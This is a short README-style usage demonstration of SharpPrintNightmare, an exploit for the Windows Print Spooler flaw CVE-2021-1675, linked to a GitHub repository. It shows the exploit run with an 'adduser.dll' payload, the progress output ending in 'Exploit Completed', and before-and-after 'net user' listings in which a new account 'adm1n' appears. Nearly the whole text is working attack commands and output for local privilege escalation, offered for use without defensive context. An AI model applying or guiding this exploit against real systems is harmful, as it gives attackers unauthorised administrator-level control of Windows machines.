https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare

# LPE

Remember absolute path of dll required

	C:\Users\testuser\Desktop>net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	Administrator            DefaultAccount           Guest
	nightmare                WDAGUtilityAccount       win10
	The command completed successfully.


	C:\Users\testuser\Desktop>SharpPrintNightmare.exe c:\users\testuser\Desktop\adduser.dll
	[*] pDriverPath C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\mxdwdrv.dll
	[*] Executing c:\users\testuser\Desktop\adduser.dll
	[*] Try 1...
	[*] Stage 0: 0
	[*] Stage 2: 0
	[+] Exploit Completed

	C:\Users\testuser\Desktop>net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	adm1n                    Administrator            DefaultAccount
	Guest                    nightmare                WDAGUtilityAccount
	win10
	The command completed successfully.

